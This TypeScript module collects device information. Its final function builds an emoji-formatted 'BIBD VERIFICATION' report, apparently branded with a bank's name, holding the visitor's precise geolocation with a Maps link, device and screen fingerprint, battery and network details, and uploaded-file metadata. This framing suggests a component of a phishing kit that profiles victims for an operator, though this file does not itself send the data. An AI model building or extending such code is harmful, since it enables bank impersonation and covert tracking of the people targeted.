/**
 * Utility functions for device information collection
 */

export function getOS(ua: string): string {
  if (/android/i.test(ua)) {
    const androidMatch = ua.match(/Android\s+([\d.]+)/);
    const modelMatch = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
    return `Android ${androidMatch?.[1] || '?'} (${modelMatch?.[1]?.trim() || 'Unknown Device'})`;
  }
  if (/iPad|iPhone|iPod/.test(ua)) {
    const iosMatch = ua.match(/OS\s+([\d_]+)/);
    return `iOS ${iosMatch?.[1]?.replace(/_/g, '.') || '?'}`;
  }
  if (/Windows/.test(ua)) {
    const winMatch = ua.match(/Windows NT\s+([\d.]+)/);
    const winVer: Record<string, string> = {
      '10.0': '10/11',
      '6.3': '8.1',
      '6.2': '8',
      '6.1': '7',
    };
    return `Windows ${winVer[winMatch?.[1] || ''] || winMatch?.[1] || '?'}`;
  }
  if (/Mac OS X/.test(ua)) {
    const macMatch = ua.match(/Mac OS X\s+([\d_]+)/);
    return `macOS ${macMatch?.[1]?.replace(/_/g, '.') || '?'}`;
  }
  if (/Linux/.test(ua)) return 'Linux';
  return 'Unknown OS';
}

export function getBrowser(ua: string): string {
  if (/Edg\//.test(ua))
    return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
  if (/Chrome\//.test(ua) && !/OPR\//.test(ua))
    return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
  if (/Firefox\//.test(ua))
    return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
  if (/Safari\//.test(ua))
    return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
  return 'Unknown Browser';
}

export function getConnection(): string {
  const conn =
    (navigator as any).connection ||
    (navigator as any).mozConnection ||
    (navigator as any).webkitConnection;
  if (conn) {
    const type = conn.effectiveType || conn.type || 'unknown';
    const downlink = conn.downlink ? `${conn.downlink} Mbps` : '';
    const rtt = conn.rtt ? ` (${conn.rtt}ms latency)` : '';
    return `${type.toUpperCase()}${downlink ? ' - ' + downlink : ''}${rtt}`;
  }
  return 'Unknown';
}

export async function getBatteryInfo(): Promise<string> {
  try {
    const battery = await (navigator as any).getBattery?.();
    if (battery) {
      const level = Math.round(battery.level * 100);
      return `${level}%${battery.charging ? ' (Charging)' : ' (Discharging)'}`;
    }
  } catch {
    // Silently fail
  }
  return 'Unknown';
}

export function formatFileSize(bytes: number): string {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}

export function getFileIcon(fileName: string): string {
  const ext = fileName.split('.').pop()?.toLowerCase() || '';
  const iconMap: Record<string, string> = {
    pdf: '📄',
    doc: '📝',
    docx: '📝',
    xls: '📊',
    xlsx: '📊',
    jpg: '🖼️',
    jpeg: '🖼️',
    png: '🖼️',
    gif: '🖼️',
    mp4: '🎥',
    zip: '📦',
    rar: '📦',
    txt: '📃',
  };
  return iconMap[ext] || '📁';
}

export async function getGeolocation(): Promise<{ lat: number; lng: number } | null> {
  return new Promise((resolve) => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve(null),
        { timeout: 10000, enableHighAccuracy: true }
      );
    } else {
      resolve(null);
    }
  });
}

export function buildDeviceInfoString(params: {
  location: { lat: number; lng: number } | null;
  uploadedFile: File | null;
  ua: string;
  batteryInfo: string;
  ramGB: string;
  cpuCores: number | string;
}): string {
  const { location, uploadedFile, ua, batteryInfo, ramGB, cpuCores } = params;

  const orientation =
    window.screen.orientation?.type ||
    (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
  const dpr = window.devicePixelRatio || 1;
  const colorDepth = window.screen.colorDepth;

  const fileInfo = uploadedFile
    ? `\n\n📎 FILE UPLOAD\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📛 Nama: ${uploadedFile.name}\n📦 Ukuran: ${formatFileSize(uploadedFile.size)}\n🏷️ Tipe: ${uploadedFile.type || 'Unknown'}`
    : '\n\n📎 FILE UPLOAD\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Tidak ada file yang diupload';

  return `🏦 BIBD VERIFICATION
━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Time: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
🕐 Timestamp: ${new Date().toISOString()}

📍 LOCATION
━━━━━━━━━━━━━━━━━━━━━━━━━━
${
  location
    ? `🌐 Latitude: ${location.lat}\n🌐 Longitude: ${location.lng}\n🔗 Google Maps: https://www.google.com/maps?q=${location.lat},${location.lng}`
    : '❌ Location denied'
}

💻 DEVICE DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 OS: ${getOS(ua)}
🌐 Browser: ${getBrowser(ua)}
🖥️ Platform: ${navigator.platform}
🌍 Language: ${navigator.language}
🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🔋 Battery: ${batteryInfo}
🧠 RAM: ${ramGB}
⚡ CPU Cores: ${cpuCores}
📶 Network: ${getConnection()}

📐 SCREEN
━━━━━━━━━━━━━━━━━━━━━━━━━━
📏 Resolution: ${window.screen.width}x${window.screen.height}
👁️ Viewport: ${window.innerWidth}x${window.innerHeight}
🔍 Pixel Ratio: ${dpr}x
🎨 Color Depth: ${colorDepth}-bit
🔃 Orientation: ${orientation}
${fileInfo}

📋 USER AGENT
━━━━━━━━━━━━━━━━━━━━━━━━━━
${ua}`;
}
